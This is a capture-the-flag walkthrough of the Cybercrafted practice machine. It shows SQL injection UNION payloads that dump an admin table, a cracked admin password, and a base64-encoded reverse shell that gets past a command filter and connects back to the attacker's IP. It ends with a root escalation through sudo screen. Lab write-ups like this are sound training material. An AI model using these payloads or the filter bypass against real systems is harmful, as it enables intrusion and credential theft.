Cybercrafted

Target IP: 10.10.161.238

Scanning


There are three TCP ports open on the target machine. From the nmap scan above, the vhost name for this target is cybercrafted.thm. I will append this to the /etc/hosts file.


Using the command ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -H "Host: FUZZ.cybercrafted.thm" -u http://cybercrafted.thm -fs 0, I notice the host has three subdomains in total.


I added the three subdomains inside /etc/hosts file. Time for enumeration!

Enumeration

Port 80: HTTP

I performed directory search against the different subdomains. However, the /search.php page at store.cybercrafted.thm is interesting.

Exploitation


This page enables the user to search for in-game items. Looks like this page is vulnerable to SQL injection. Sending the payload ' OR 1=1-- // outputs all the contents from the current table. When trying to find the number of columns, I notice ' ORDER BY 4-- // is the perfect number of columns; any higher and nothing gets displayed.


Sending the payload ' UNION SELECT NULL,database(),user(),@@version-- // returns the output above. The current database being used is webapp.


It looks like there are two tables: admin and stock. The admin contains the information about the users; whereas, the stock contains the in-game items information. I used the payload ' UNION SELECT null, table_name, column_name, table_schema from information_schema.columns where table_schema=database() -- // to identify this.


And boom! Using the payload ' UNION SELECT NULL, id, user, hash FROM webapp.admin-- // returns more information about the admin table! This table contains one user called xXUltimateCreeperXx.


Using crackstation, I obtained the password of the admin. I now have the credentials of the admin: xXUltimateCreeperXx:diamond123456789. I should be able to login to http://admin.cybercrafted.thm/panel.php now.


And it worked. I now have access to the commands page where I can issue commands to the target machine.


Looks like there is filtering in place. Running commands such as cat gets dropped immediately. Even reverse shell commands were being dropped. However, I bypassed this filter by encoding my reverse shell as a base64 string and having the target machine execute it using bash. I started a listener on port 8443 and received a reverse shell connection back! The payload I used is below:
echo 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjE0LjU1LjE1MyIsODQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc=' | base64 -d | bash

Privilege Escalation


I have access to the admin's SSH key.


I copied the admin's SSH key to my local machine, used john to crack the passphrase, changed permission to 400, and logged in with the key as xxultimatecreeperxx. And now I have access to the target machine as the admin.


The admin is a group of minecraft. Searching for files in this group leads to interesting result.


There is a sketchy plugin used called LoginSystem. This plugin contains the usernames and passwords.


The password of the user cybercrafted is inside logs.txt. I successfully switched to this user using the password in the picture above.


Looks like I can use this to gain a root shell.


I entered the command sudo /usr/bin/screen -r cybercrafted and presseed CTRL+a+c to spawn a root shell.
